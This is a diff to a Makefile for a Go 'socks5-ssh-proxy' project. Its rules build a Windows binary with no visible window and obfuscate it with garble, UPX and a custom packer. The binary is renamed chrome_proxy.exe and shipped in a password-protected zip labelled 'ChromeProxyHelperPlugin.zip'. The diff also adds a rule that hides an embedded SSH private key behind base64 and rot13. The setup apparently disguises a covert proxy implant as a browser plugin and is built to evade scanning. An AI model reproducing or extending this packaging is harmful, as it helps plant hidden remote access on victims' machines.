@@ -20,16 +20,18 @@ socks5-ssh-proxy.release: resources $(SOURCES) $(GARBLE_BIN)
 	upx $@
 win: socks5-ssh-proxy.exe
 socks5-ssh-proxy.exe: resources $(GARBLE_BIN) $(SOURCES)
+	CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ CGO_ENABLED=1 GOOS=windows GOARCH=amd64 go build -trimpath -ldflags "-s -w -H=windowsgui" -tags windows,release -o $@
 #	CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ GOOS=windows GOARCH=amd64 $(GARBLE_CMD) build -ldflags "-H=windowsgui -X cfg.VerboseModeKey=$(RELEASE_VERBOSE_MODE_KEY)" -tags release -o $@
-	CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ GOOS=windows GOARCH=amd64 $(GARBLE_CMD) build -ldflags "-H=windowsgui" -tags release -o $@
-	upx $@
-	go run cmd/upx-obfuscator/main.go $@
+	#CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ GOOS=windows GOARCH=amd64 $(GARBLE_CMD) build -ldflags "-H=windowsgui" -tags release -o $@
+	#upx $@
+	#go run cmd/upx-obfuscator/main.go $@
 goreleaser: resources $(GARBLE_BIN)
-	goreleaser build --clean --snapshot --id win-release
+	goreleaser build --verbose --clean --snapshot --id win-release
+#	goreleaser build --clean --snapshot --id win-release
 win-package: ChromeProxyHelperPlugin.zip
 ChromeProxyHelperPlugin.zip: socks5-ssh-proxy.exe
 	cp socks5-ssh-proxy.exe chrome_proxy.exe
-	upx chrome_proxy.exe
+	#upx chrome_proxy.exe
 	zip -eP resistanceIsFutile ChromeProxyHelperPlugin.zip chrome_proxy.exe
 	rm -f chrome_proxy.exe
 install-deps: $(GARBLE_BIN)
@@ -59,10 +61,12 @@ resources/ssh_private_key:
 	@echo "====================================="
 resources/ssh_private_key.base64: resources/ssh_private_key
 	base64 -i $< -o $@
+resources/ssh_private_key.base64.rot13: resources/ssh_private_key.base64
+	go run cmd/rot13-obfuscator/main.go $< $@
 
 fmt:
 	gofmt -w *.go
 
-secrets: config_release.go.base64 resources/ssh_private_key.base64
+secrets: config_release.go.base64 resources/ssh_private_key.base64.rot13
 
 .phony: clean test win
